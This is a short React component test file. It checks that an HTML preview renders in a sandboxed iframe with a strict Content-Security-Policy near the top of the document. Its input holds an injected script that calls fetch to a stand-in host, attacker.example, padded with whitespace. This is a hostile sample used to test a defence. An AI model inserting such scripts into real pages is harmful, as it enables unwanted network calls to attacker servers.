import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { HtmlRenderer } from "./HtmlRenderer";

describe("HtmlRenderer security", () => {
  it("disables active content and browser network access", () => {
    render(
      <HtmlRenderer
        content={`${" ".repeat(2_000)}<html><head></head><body><script>fetch("https://attacker.example")</script></body></html>`}
      />,
    );

    const frame = screen.getByTitle("HTML preview");
    expect(frame).toHaveAttribute("sandbox", "");
    expect(frame).toHaveAttribute("srcdoc", expect.stringContaining("Content-Security-Policy"));
    expect(frame.getAttribute("srcdoc")).toContain("default-src 'none'");
    expect(frame.getAttribute("srcdoc")?.indexOf("Content-Security-Policy")).toBeLessThan(1_024);
  });
});
